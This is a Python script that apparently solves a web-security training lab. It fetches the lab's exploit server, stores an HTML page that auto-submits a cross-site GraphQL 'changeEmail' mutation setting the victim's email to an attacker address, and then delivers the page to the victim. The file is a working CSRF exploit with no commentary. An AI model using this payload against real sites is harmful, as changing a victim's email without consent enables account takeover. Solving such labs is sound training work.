import sys
import requests
import re

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'

session = requests.Session()
response = session.get(login_url)

#csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
#csrf = csrf_token_match.group(1)

#burp_data = {"csrf": csrf, "username": "wiener", "password": "peter"}
#session.post(login_url, data=burp_data)

response = session.get(burp_url)
match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
exploit_server = match.group(0)


burp_data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8", "responseBody": f"<html>\r\n  <body>\r\n    <form action=\"{burp_url}/graphql/v1\" method=\"POST\">\r\n      <input type=\"hidden\" name=\"query\" value=\"&#10;&#32;&#32;&#32;&#32;mutation&#32;changeEmail&#40;&#36;input&#58;&#32;ChangeEmailInput&#33;&#41;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;changeEmail&#40;input&#58;&#32;&#36;input&#41;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;email&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#125;&#10;&#32;&#32;&#32;&#32;&#125;&#10;\" />\r\n      <input type=\"hidden\" name=\"operationName\" value=\"changeEmail\" />\r\n      <input type=\"hidden\" name=\"variables\" value=\"&#123;&quot;input&quot;&#58;&#123;&quot;email&quot;&#58;&quot;hacker&#64;hacker&#46;com&quot;&#125;&#125;\" />\r\n      <input type=\"submit\" value=\"Submit request\" />\r\n    </form>\r\n    <script>\r\n      history.pushState('', '', '/');\r\n      document.forms[0].submit();\r\n    </script>\r\n  </body>\r\n</html>\r\n", "formAction": "STORE"}
session.post(exploit_server, data=burp_data)
session.get(burp_url + '/deliver-to-victim')
